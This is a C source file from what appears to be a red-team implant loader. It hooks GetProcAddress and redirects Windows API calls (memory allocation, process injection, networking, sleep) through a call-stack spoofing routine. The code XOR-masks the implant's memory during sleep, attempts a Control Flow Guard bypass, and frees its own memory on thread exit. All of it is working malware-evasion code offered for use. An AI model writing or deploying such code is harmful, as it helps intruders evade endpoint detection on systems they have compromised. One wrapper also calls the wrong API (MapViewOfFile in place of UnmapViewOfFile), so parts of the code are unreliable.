/*
 * Copyright 2025 Daniel Duggan, Zero-Point Security
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include <wininet.h>
#include "hook.h"
#include "cfg.h"
#include "tcg.h"

/* store resolved functions */
void * g_InternetOpenA;
void * g_InternetConnectA;
void * g_CoCreateInstance;
void * g_ExitThread;

/* patched in from loader.spec */
char xorkey[128] = { 1 };

/* some globals */
MEMORY_LAYOUT g_layout;

LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$VirtualAlloc);
    call.argc     = 4;
    call.args[0]  = (ULONG_PTR)(lpAddress);
    call.args[1]  = (ULONG_PTR)(dwSize);
    call.args[2]  = (ULONG_PTR)(flAllocationType);
    call.args[3]  = (ULONG_PTR)(flProtect);

    return (LPVOID)draugr(&call);
}

LPVOID WINAPI _VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$VirtualAllocEx);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpAddress);
    call.args[2]  = (ULONG_PTR)(dwSize);
    call.args[3]  = (ULONG_PTR)(flAllocationType);
    call.args[4]  = (ULONG_PTR)(flProtect);

    return (LPVOID)draugr(&call);
}

BOOL WINAPI _VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$VirtualProtect);
    call.argc     = 4;
    call.args[0]  = (ULONG_PTR)(lpAddress);
    call.args[1]  = (ULONG_PTR)(dwSize);
    call.args[2]  = (ULONG_PTR)(flNewProtect);
    call.args[3]  = (ULONG_PTR)(lpflOldProtect);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$VirtualProtectEx);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpAddress);
    call.args[2]  = (ULONG_PTR)(dwSize);
    call.args[3]  = (ULONG_PTR)(flNewProtect);
    call.args[4]  = (ULONG_PTR)(lpflOldProtect);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$VirtualFree);
    call.argc     = 3;
    call.args[0]  = (ULONG_PTR)(lpAddress);
    call.args[1]  = (ULONG_PTR)(dwSize);
    call.args[2]  = (ULONG_PTR)(dwFreeType);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _GetThreadContext(HANDLE hThread, LPCONTEXT lpContext)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$GetThreadContext);
    call.argc     = 2;
    call.args[0]  = (ULONG_PTR)(hThread);
    call.args[1]  = (ULONG_PTR)(lpContext);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _SetThreadContext(HANDLE hThread, const CONTEXT *lpContext)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$SetThreadContext);
    call.argc     = 2;
    call.args[0]  = (ULONG_PTR)(hThread);
    call.args[1]  = (ULONG_PTR)(lpContext);

    return (BOOL)draugr(&call);
}

HINTERNET WINAPI _InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(g_InternetOpenA);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(lpszAgent);
    call.args[1]  = (ULONG_PTR)(dwAccessType);
    call.args[2]  = (ULONG_PTR)(lpszProxy);
    call.args[3]  = (ULONG_PTR)(lpszProxyBypass);
    call.args[4]  = (ULONG_PTR)(dwFlags);

    return (HINTERNET)draugr(&call);
}

HINTERNET WINAPI _InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(g_InternetConnectA);
    call.argc     = 8;
    call.args[0]  = (ULONG_PTR)(hInternet);
    call.args[1]  = (ULONG_PTR)(lpszServerName);
    call.args[2]  = (ULONG_PTR)(nServerPort);
    call.args[3]  = (ULONG_PTR)(lpszUserName);
    call.args[4]  = (ULONG_PTR)(lpszPassword);
    call.args[5]  = (ULONG_PTR)(dwService);
    call.args[6]  = (ULONG_PTR)(dwFlags);
    call.args[7]  = (ULONG_PTR)(dwContext);

    return (HINTERNET)draugr(&call);
}

DWORD WINAPI _ResumeThread(HANDLE hThread)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$ResumeThread);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(hThread);

    return (DWORD)draugr(&call);
}

HANDLE WINAPI _CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$CreateThread);
    call.argc     = 6;
    call.args[0]  = (ULONG_PTR)(lpThreadAttributes);
    call.args[1]  = (ULONG_PTR)(dwStackSize);
    call.args[2]  = (ULONG_PTR)(lpStartAddress);
    call.args[3]  = (ULONG_PTR)(lpParameter);
    call.args[4]  = (ULONG_PTR)(dwCreationFlags);
    call.args[5]  = (ULONG_PTR)(lpThreadId);

    return (HANDLE)draugr(&call);
}

HANDLE WINAPI _CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$CreateRemoteThread);
    call.argc     = 7;
    call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpThreadAttributes);
    call.args[2]  = (ULONG_PTR)(dwStackSize);
    call.args[3]  = (ULONG_PTR)(lpStartAddress);
    call.args[4]  = (ULONG_PTR)(lpParameter);
    call.args[5]  = (ULONG_PTR)(dwCreationFlags);
    call.args[6]  = (ULONG_PTR)(lpThreadId);

    return (HANDLE)draugr(&call);
}

HANDLE WINAPI _OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$OpenProcess);
    call.argc     = 3;
    call.args[0]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[1]  = (ULONG_PTR)(bInheritHandle);
    call.args[2]  = (ULONG_PTR)(dwProcessId);

    return (HANDLE)draugr(&call);
}

HANDLE WINAPI _OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$OpenThread);
    call.argc     = 3;
    call.args[0]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[1]  = (ULONG_PTR)(bInheritHandle);
    call.args[2]  = (ULONG_PTR)(dwThreadId);

    return (HANDLE)draugr(&call);
}

BOOL WINAPI _CloseHandle(HANDLE hObject)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$CloseHandle);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(hObject);

    return (BOOL)draugr(&call);
}

HANDLE WINAPI _CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$CreateFileMappingA);
    call.argc     = 6;
    call.args[0]  = (ULONG_PTR)(hFile);
    call.args[1]  = (ULONG_PTR)(lpFileMappingAttributes);
    call.args[2]  = (ULONG_PTR)(flProtect);
    call.args[3]  = (ULONG_PTR)(dwMaximumSizeHigh);
    call.args[4]  = (ULONG_PTR)(dwMaximumSizeLow);
    call.args[5]  = (ULONG_PTR)(lpName);

    return (HANDLE)draugr(&call);
}

LPVOID WINAPI _MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$MapViewOfFile);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(hFileMappingObject);
    call.args[1]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[2]  = (ULONG_PTR)(dwFileOffsetHigh);
    call.args[3]  = (ULONG_PTR)(dwFileOffsetLow);
    call.args[4]  = (ULONG_PTR)(dwNumberOfBytesToMap);

    return (LPVOID)draugr(&call);
}

BOOL WINAPI _UnmapViewOfFile(LPCVOID lpBaseAddress)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$MapViewOfFile);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(lpBaseAddress);

    return (BOOL)draugr(&call);
}

SIZE_T WINAPI _VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$VirtualQuery);
    call.argc     = 3;
    call.args[0]  = (ULONG_PTR)(lpAddress);
    call.args[1]  = (ULONG_PTR)(lpBuffer);
    call.args[2]  = (ULONG_PTR)(dwLength);

    return (SIZE_T)draugr(&call);
}

BOOL WINAPI _DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$DuplicateHandle);
    call.argc     = 7;
    call.args[0]  = (ULONG_PTR)(hSourceProcessHandle);
    call.args[1]  = (ULONG_PTR)(hSourceHandle);
    call.args[2]  = (ULONG_PTR)(hTargetProcessHandle);
    call.args[3]  = (ULONG_PTR)(lpTargetHandle);
    call.args[4]  = (ULONG_PTR)(dwDesiredAccess);
    call.args[5]  = (ULONG_PTR)(bInheritHandle);
    call.args[6]  = (ULONG_PTR)(dwOptions);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$ReadProcessMemory);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpBaseAddress);
    call.args[2]  = (ULONG_PTR)(lpBuffer);
    call.args[3]  = (ULONG_PTR)(nSize);
    call.args[4]  = (ULONG_PTR)(lpNumberOfBytesRead);

    return (BOOL)draugr(&call);
}

BOOL WINAPI _WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$WriteProcessMemory);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(hProcess);
    call.args[1]  = (ULONG_PTR)(lpBaseAddress);
    call.args[2]  = (ULONG_PTR)(lpBuffer);
    call.args[3]  = (ULONG_PTR)(nSize);
    call.args[4]  = (ULONG_PTR)(lpNumberOfBytesWritten);

    return (BOOL)draugr(&call);
}

DECLSPEC_NORETURN VOID WINAPI _ExitThread(DWORD dwExitCode)
{
    /* is cfg enabled? */
    BOOL cfgEnabled = CfgEnabled();

    if (cfgEnabled) {
        /* try to bypass it at NtContinue */
        if (BypassCfg(NTDLL$NtContinue)) {
            cfgEnabled = FALSE;
        }
    }

    if (!cfgEnabled)
    {
        CONTEXT ctx;
        memset(&ctx, 0, sizeof(CONTEXT));

        ctx.ContextFlags = CONTEXT_ALL;

        HANDLE hTimerQueue = NULL;
        HANDLE hNewTimer   = NULL;

        hTimerQueue = KERNEL32$CreateTimerQueue();

        if (KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)(KERNEL32$RtlCaptureContext), &ctx, 0, 0, WT_EXECUTEINTIMERTHREAD))
        {
            KERNEL32$Sleep(1000);
            
            if (ctx.Rip != 0)
            {
                HANDLE   hHeap   = KERNEL32$GetProcessHeap();
                PCONTEXT ctxFree = (PCONTEXT)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(CONTEXT) * 3);

                for (int i = 0; i < 3; i++) { 
                    memcpy(&ctxFree[i], &ctx, sizeof(CONTEXT));
                }

                ctxFree[0].Rsp -= sizeof(PVOID);
                ctxFree[0].Rip = (DWORD64)(KERNEL32$VirtualFree);
                ctxFree[0].Rcx = (DWORD64)(g_layout.dll.baseAddress);
                ctxFree[0].Rdx = (DWORD64)(0);
                ctxFree[0].R8  = (DWORD64)(MEM_RELEASE);

                ctxFree[1].Rsp -= sizeof(PVOID);
                ctxFree[1].Rip = (DWORD64)(KERNEL32$VirtualFree);
                ctxFree[1].Rcx = (DWORD64)(g_layout.hooks.baseAddress);
                ctxFree[1].Rdx = (DWORD64)(0);
                ctxFree[1].R8  = (DWORD64)(MEM_RELEASE);

                ctxFree[2].Rsp -= sizeof(PVOID);
                ctxFree[2].Rip = (DWORD64)(KERNEL32$VirtualFree);
                ctxFree[2].Rcx = (DWORD64)(g_layout.pic.baseAddress);
                ctxFree[2].Rdx = (DWORD64)(0);
                ctxFree[2].R8  = (DWORD64)(MEM_RELEASE);

                KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)(NTDLL$NtContinue), &ctxFree[0], 500, 0, WT_EXECUTEINTIMERTHREAD);
                KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)(NTDLL$NtContinue), &ctxFree[1], 500, 0, WT_EXECUTEINTIMERTHREAD);
                KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)(NTDLL$NtContinue), &ctxFree[2], 500, 0, WT_EXECUTEINTIMERTHREAD);
            }
        }
    }

    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(g_ExitThread);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(dwExitCode);

    draugr(&call);
}

BOOL WINAPI _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$CreateProcessA);
    call.argc     = 10;
    call.args[0]  = (ULONG_PTR)(lpApplicationName);
    call.args[1]  = (ULONG_PTR)(lpCommandLine);
    call.args[2]  = (ULONG_PTR)(lpProcessAttributes);
    call.args[3]  = (ULONG_PTR)(lpThreadAttributes);
    call.args[4]  = (ULONG_PTR)(bInheritHandles);
    call.args[5]  = (ULONG_PTR)(dwCreationFlags);
    call.args[6]  = (ULONG_PTR)(lpEnvironment);
    call.args[7]  = (ULONG_PTR)(lpCurrentDirectory);
    call.args[8]  = (ULONG_PTR)(lpStartupInfo);
    call.args[9]  = (ULONG_PTR)(lpProcessInformation);

    return (BOOL)draugr(&call);
}

HRESULT _CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(g_CoCreateInstance);
    call.argc     = 5;
    call.args[0]  = (ULONG_PTR)(rclsid);
    call.args[1]  = (ULONG_PTR)(pUnkOuter);
    call.args[2]  = (ULONG_PTR)(dwClsContext);
    call.args[3]  = (ULONG_PTR)(riid);
    call.args[4]  = (ULONG_PTR)(ppv);

    return (HRESULT)draugr(&call);
}

void applyxor(char * data, DWORD len)
{
    for (DWORD x = 0; x < len; x++) {
        data[x] ^= xorkey[x % 128];
    }
}

BOOL isWriteable(DWORD protection)
{
    if (protection == PAGE_EXECUTE_READWRITE || protection == PAGE_EXECUTE_WRITECOPY || protection == PAGE_READWRITE || protection == PAGE_WRITECOPY) {
        return TRUE;
    }
    return FALSE;
}

void xorsection(MEMORY_SECTION * section, BOOL mask)
{
    if (mask == TRUE && isWriteable(section->currentProtect) == FALSE) {
        DWORD oldProtect = 0;
        if (_VirtualProtect(section->baseAddress, section->size, PAGE_READWRITE, &oldProtect)) {
            section->currentProtect  = PAGE_READWRITE;
            section->previousProtect = oldProtect;
        }
    }

    if (isWriteable(section->currentProtect)) {
        applyxor(section->baseAddress, section->size);
    }

    if (mask == FALSE && section->currentProtect != section->previousProtect) {
        DWORD oldProtect;
        if (_VirtualProtect(section->baseAddress, section->size, section->previousProtect, &oldProtect)) {
            section->currentProtect  = section->previousProtect;
            section->previousProtect = oldProtect;
        }
    }
}

void xorregion(MEMORY_REGION * region, BOOL mask)
{
    for (int i = 0; i < 5; i++) {
        xorsection(&region->sections[i], mask);
    }
}

void xormemory(BOOL mask) {
    xorregion(&g_layout.dll, mask);
}

VOID WINAPI _Sleep(DWORD dwMilliseconds)
{
    /*
    * only xor and stack spoof if
    * sleep is >= 1s
    */

    if (dwMilliseconds < 1000) {
        KERNEL32$Sleep(dwMilliseconds);
        return;
    }
    
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(KERNEL32$Sleep);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(dwMilliseconds);

    xormemory(TRUE);
    draugr(&call);
    xormemory(FALSE);
}

HMODULE WINAPI _LoadLibraryA(LPCSTR lpLibFileName)
{
    FUNCTION_CALL call;
    memset(&call, 0, sizeof(FUNCTION_CALL));

    call.function = (PVOID)(LoadLibraryA);
    call.argc     = 1;
    call.args[0]  = (ULONG_PTR)(lpLibFileName);

    return (HMODULE)draugr(&call);
}

char * WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
    char * result = (char *)GetProcAddress(hModule, lpProcName);

    /*
    * Check to see what function is being resolved.
    * Note that lpProcName may be an ordinal, not a string.
    */

    if ((ULONG_PTR)lpProcName >> 16 == 0) {
        /* it's an ordinal */
        return result;
    }

    /* Look at the ones we want to hook */

    /* Calculte function hash */
    DWORD h = hash((char *)lpProcName);

    if (h == GETPROCADDRESS_HASH) {
        return (char *)_GetProcAddress;
    }
    else if (h == LOADLIBRARYA_HASH) {
        return (char *)_LoadLibraryA;
    }
    else if (h == VIRTUALALLOC_HASH) {
        return (char *)_VirtualAlloc;
    }
    else if (h == VIRTUALALLOCEX_HASH) {
        return (char *)_VirtualAllocEx;
    }
    else if (h == VIRTUALPROTECT_HASH) {
        return (char *)_VirtualProtect;
    }
    else if (h == VIRTUALPROTECTEX_HASH) {
        return (char *)_VirtualProtectEx;
    }
    else if (h == VIRTUALFREE_HASH) {
        return (char *)_VirtualFree;
    }
    else if (h == GETTHREADCONTEXT_HASH) {
        return (char *)_GetThreadContext;
    }
    else if (h == SETTHREADCONTEXT_HASH) {
        return (char *)_SetThreadContext;
    }
    else if (h == INTERNETOPENA_HASH) {
        g_InternetOpenA = result;
        return (char *)_InternetOpenA;
    }
    else if (h == INTERNETCONNECTA_HASH) {
        g_InternetConnectA = result;
        return (char *)_InternetConnectA;
    }
    else if (h == RESUMETHREAD_HASH) {
        return (char *)_ResumeThread;
    }
    else if (h == CREATETHREAD_HASH) {
        return (char *)_CreateThread;
    }
    else if (h == CREATEREMOTETHREAD_HASH) {
        return (char *)_CreateRemoteThread;
    }
    else if (h == OPENPROCESS_HASH) {
        return (char *)_OpenProcess;
    }
    else if (h == OPENTHREAD_HASH) {
        return (char *)_OpenThread;
    }
    else if (h == CLOSEHANDLE_HASH) {
        return (char *)_CloseHandle;
    }
    else if (h == CREATEFILEMAPPINGA_HASH) {
        return (char *)_CreateFileMappingA;
    }
    else if (h == MAPVIEWOFFILE_HASH) {
        return (char *)_MapViewOfFile;
    }
    else if (h == UNMAPVIEWOFFILE_HASH) {
        return (char *)_UnmapViewOfFile;
    }
    else if (h == VIRTUALQUERY_HASH) {
        return (char *)_VirtualQuery;
    }
    else if (h == DUPLICATEHANDLE_HASH) {
        return (char *)_DuplicateHandle;
    }
    else if (h == READPROCESSMEMORY_HASH) {
        return (char *)_ReadProcessMemory;
    }
    else if (h == WRITEPROCESSMEMORY_HASH) {
        return (char *)_WriteProcessMemory;
    }
    else if (h == EXITTHREAD_HASH) {
        g_ExitThread = result;
        return (char *)_ExitThread;
    }
    else if (h == CREATEPROCESSA_HASH) {
        return (char *)_CreateProcessA;
    }
    else if (h == SLEEP_HASH) {
        return (char *)_Sleep;
    }
    else if (h == COCREATEINSTANCE_HASH) {
        g_CoCreateInstance = result;
        return (char *)_CoCreateInstance;
    }

    return result;
}

void go(IMPORTFUNCS * funcs, MEMORY_LAYOUT * layout)
{
    funcs->LoadLibraryA   = (__typeof__(LoadLibraryA)   *)_LoadLibraryA;
    funcs->GetProcAddress = (__typeof__(GetProcAddress) *)_GetProcAddress;

    if (layout != NULL) {
        g_layout = *layout;
    }

    initFrameInfo();
}